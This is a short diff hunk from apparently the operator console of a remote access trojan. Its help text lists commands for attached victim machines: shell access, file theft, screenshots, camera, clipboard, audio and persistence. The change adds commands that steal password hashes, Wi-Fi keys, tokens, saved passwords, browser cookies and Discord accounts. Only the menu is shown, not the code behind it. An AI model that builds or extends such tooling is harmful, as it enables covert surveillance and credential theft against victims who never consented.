@@ -22,7 +22,8 @@ loot_dir = os.path.expanduser("~/loot")
 
 HELP = """ls | in <id> | loot | dl <fid> | link | q
 attached: shell commands, or .leave .info .ls .cd .get .put .steal .grab .shot .cam
-          .clip .toast .vibrate .audio .py .persist .unpersist .sd"""
+          .clip .toast .vibrate .audio .py .hash .wifi .tokens .passwords
+          .cookies .discord .persist .unpersist .sd"""
 
 
 def api(path, data=None, hdr=None, raw=False, timeout=90):
